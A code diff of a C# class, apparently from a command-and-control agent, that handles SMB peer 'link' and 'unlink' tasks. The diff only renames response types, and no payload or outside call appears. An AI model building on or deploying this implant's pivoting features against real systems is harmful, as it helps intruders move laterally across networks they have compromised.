@@ -26,7 +26,7 @@ namespace Agent
             SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);
             if (args is null)
             {
-                await messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = "Invalid parameters.",
@@ -44,7 +44,7 @@ namespace Agent
                 case "unlink":
                     if (await UnlinkForwarder(job.task.id))
                     {
-                        await this.messageManager.AddResponse(new ResponseResult()
+                        await this.messageManager.AddResponse(new TaskResponse()
                         {
                             task_id = job.task.id,
                             user_output = "Link removed.",
@@ -54,7 +54,7 @@ namespace Agent
                     }
                     else
                     {
-                        await this.messageManager.AddResponse(new ResponseResult()
+                        await this.messageManager.AddResponse(new TaskResponse()
                         {
                             task_id = job.task.id,
                             user_output = "Failed to unlink.",
@@ -79,12 +79,12 @@ namespace Agent
 
             if(this.tempForwarders.TryAdd(linkId, link))
             {
-                EdgeResponseResult err = await this.tempForwarders[linkId].Link();
+                EdgeResponse err = await this.tempForwarders[linkId].Link();
                 await this.messageManager.AddResponse(err.ToJson());
                 return;
             }
 
-            await this.messageManager.AddResponse(new ResponseResult()
+            await this.messageManager.AddResponse(new TaskResponse()
             {
                 task_id = task_id,
                 user_output = "Link already exists.",
@@ -129,7 +129,7 @@ namespace Agent
                 sb.AppendLine($"ID: {fwdr.Value.linkId}\tType: smb\tConnected: {fwdr.Value.connected}");
             }
 
-            await this.messageManager.AddResponse(new ResponseResult()
+            await this.messageManager.AddResponse(new TaskResponse()
             {
                 user_output = sb.ToString(),
                 task_id = job.task.id,
